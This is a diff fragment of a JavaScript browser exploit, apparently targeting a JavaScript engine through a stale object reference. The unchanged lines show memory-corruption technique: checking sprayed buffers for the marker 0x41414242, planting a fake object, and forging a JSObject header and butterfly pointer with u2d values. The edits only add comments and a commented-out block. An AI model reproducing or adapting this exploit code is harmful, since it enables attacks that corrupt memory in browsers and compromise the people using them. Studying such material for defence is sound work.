@@ -173,9 +173,12 @@ function go_() {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
+				// Create fakeobj for fixing butterfly
 				var fakeobj = {};
+				
 				stale[0] = fakeobj;
 				var fop = bufs[i][k];
+				
 				stale[0] = {
 					'a': u2d(105, 0x1172600), // the JSObject properties
 					'b': u2d(0, 0), // Butterfly ptr
@@ -221,8 +224,16 @@ function go_() {
  					smashed(stale[0]);
  				}
 				alert("3");
-
+				//alert("4");
 				
+				// Uncommenting this block comment breaks everything.
+				/*
+				
+ 				
+ 				// stale[0][5] = 1; // address, high 32 bits == 0x100000000
+ 				
+
+				*/
 				return;
 			}
 		}
